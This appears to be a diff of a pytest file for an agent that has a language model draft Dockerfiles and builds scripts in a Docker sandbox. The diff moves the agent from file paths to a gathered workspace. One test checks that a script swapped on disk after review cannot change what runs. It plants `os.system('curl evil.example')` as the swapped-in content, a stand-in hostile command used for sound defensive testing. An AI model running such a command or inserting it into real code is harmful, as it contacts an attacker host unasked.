@@ -15,6 +15,7 @@ from envforge.agent import (
 )
 from envforge.llm import Call, InvalidArguments, Refused, Truncated
 from envforge.sandbox import BuildResult, DockerSandbox, Limits, RunResult
+from envforge.workspace import Files, gather
 
 GOOD = "FROM python:3.12-slim\nCOPY s.py /app/s.py\nENTRYPOINT [\"python\", \"/app/s.py\"]\n"
 def ALLOW(dockerfile, base_image, allowed_files):   # the sitting 6 gate, stubbed open
@@ -60,8 +61,9 @@ class FakeSandbox:
         self.builds, self.runs = list(builds), list(runs)
         self.built = []
 
-    def build(self, dockerfile, script, tag):
+    def build(self, dockerfile, files, tag):
         self.built.append(dockerfile)
+        self.context = dict(files)
         return self.builds.pop(0) if self.builds else _build()
 
     def run(self, image, args=()):
@@ -81,13 +83,15 @@ def _run(exit_code=0, stdout="", stderr="", timed_out=False, start_error=""):
 
 @pytest.fixture
 def script(tmp_path):
+    """A workspace, not a path. The agent has not taken a path since the manifest
+    landed, which is what makes the script read exactly once."""
     path = tmp_path / "s.py"
     path.write_text("print('hello')\n")
-    return path
+    return gather(path)
 
 
-def drive(agent, script, args=()):
-    events = list(agent.run(script, "python", args))
+def drive(agent, workspace, args=(), language="python"):
+    events = list(agent.run(workspace, language, args))
     return events, [e.kind for e in events], events[-1].data["outcome"]
 
 
@@ -268,6 +272,54 @@ def test_a_fallback_that_does_not_build_stops_instead_of_asking_again(script):
     assert outcome.build is not None and outcome.used_fallback
 
 
+# --- what the manifest bought -------------------------------------------------------------
+
+def test_the_script_is_read_once_and_cannot_change_underneath_us(tmp_path):
+    """The reason build takes contents rather than a path.
+
+    Until this piece landed the script was read twice: once here for the prompt and
+    once from disk when the build context was assembled. A file that changed between
+    those two reads meant the model reviewed one script and the container ran another,
+    and the verdict would have described a file that never executed."""
+    path = tmp_path / "s.py"
+    path.write_text("print('original')\n")
+    workspace = gather(path)
+
+    path.write_text("import os; os.system('curl evil.example')\n")   # swapped after
+
+    llm = FakeLLM(_call())
+    sandbox = FakeSandbox()
+    drive(Agent(llm, sandbox, ALLOW), workspace)
+    assert "original" in llm.prompts[0]                  # what the model reviewed
+    assert sandbox.context == {"s.py": "print('original')\n"}   # what would have run
+    assert "curl evil" not in str(sandbox.context)
+
+
+def test_a_manifest_reaches_both_the_gate_and_the_build_context(tmp_path):
+    """`allowed_files` was a hardcoded singleton until this piece. Now a COPY may name
+    anything the workspace gathered, and the build context actually contains it."""
+    (tmp_path / "s.py").write_text("import requests\n")
+    (tmp_path / "requirements.txt").write_text("requests==2.32.0\n")
+    workspace = gather(tmp_path / "s.py", LANGUAGES["python"].siblings)
+
+    gate = RecordingGate()
+    sandbox = FakeSandbox()
+    drive(Agent(FakeLLM(_call()), sandbox, gate), workspace)
+
+    assert gate.seen[0][2] == frozenset({"s.py", "requirements.txt"})
+    assert sandbox.context == {"s.py": "import requests\n",
+                               "requirements.txt": "requests==2.32.0\n"}
+
+
+def test_the_agent_never_receives_a_path(tmp_path):
+    """The whole point of the workspace. If this ever passes a Path again, the second
+    read comes back with it."""
+    import inspect
+    signature = inspect.signature(Agent.run)
+    assert "script" not in signature.parameters
+    assert signature.parameters["workspace"].annotation == "Workspace"
+
+
 # --- reading the language off the filename ------------------------------------------------
 
 @pytest.mark.parametrize("filename, expected", [
@@ -309,7 +361,7 @@ def test_an_unsupported_language_is_refused_at_the_door(tmp_path):
     script = tmp_path / "s.rb"
     script.write_text('puts "hi"\n')
     llm = FakeLLM()                       # never consulted
-    events = list(Agent(llm, FakeSandbox(), ALLOW).run(script, "ruby"))
+    events = list(Agent(llm, FakeSandbox(), ALLOW).run(gather(script), "ruby"))
     outcome = events[-1].data["outcome"]
     assert [e.kind for e in events] == ["finished"]
     assert outcome.ok is False and "not 'ruby'" in outcome.reason
@@ -323,7 +375,7 @@ def test_an_unsupported_language_used_to_crash_on_a_refusal(tmp_path):
     script.write_text('puts "hi"\n')
     agent = Agent(FakeLLM(Refused("no", reason="a"), Refused("no", reason="b")),
                   FakeSandbox(), ALLOW)
-    outcome = list(agent.run(script, "ruby"))[-1].data["outcome"]
+    outcome = list(agent.run(gather(script), "ruby"))[-1].data["outcome"]
     assert outcome.ok is False           # an outcome, not an exception
 
 
@@ -335,7 +387,7 @@ def test_bash_is_supported_and_says_so(tmp_path):
     assert "FROM debian:12-slim" in dockerfile
     assert 'ENTRYPOINT ["bash", "/app/s.sh"]' in dockerfile
     llm = FakeLLM(_call(dockerfile, base="debian:12-slim"))
-    outcome = list(Agent(llm, FakeSandbox(), ALLOW).run(script, "bash"))[-1].data["outcome"]
+    outcome = list(Agent(llm, FakeSandbox(), ALLOW).run(gather(script), "bash"))[-1].data["outcome"]
     assert outcome.ok
 
 
@@ -352,7 +404,7 @@ def test_the_script_is_bounded_before_it_reaches_the_prompt(tmp_path):
     script = tmp_path / "s.py"
     script.write_text("#" * (SCRIPT_LIMIT * 3))
     llm = FakeLLM(_call())
-    list(Agent(llm, FakeSandbox(), ALLOW).run(script, "python"))
+    list(Agent(llm, FakeSandbox(), ALLOW).run(gather(script), "python"))
     assert "characters removed" in llm.prompts[0]
     assert len(llm.prompts[0]) < SCRIPT_LIMIT * 2
 
@@ -375,7 +427,7 @@ def test_the_whole_loop_against_a_real_daemon(tmp_path):
     dockerfile = default_dockerfile("python", "hello.py")
     agent = Agent(FakeLLM(_call(dockerfile)),
                   DockerSandbox(Limits(run_timeout=60.0)), ALLOW)
-    events = list(agent.run(script, "python"))
+    events = list(agent.run(gather(script), "python"))
     outcome = events[-1].data["outcome"]
     assert outcome.ok and outcome.attempts == 1
     assert outcome.run.exit_code == 3 and "from inside" in outcome.run.stdout
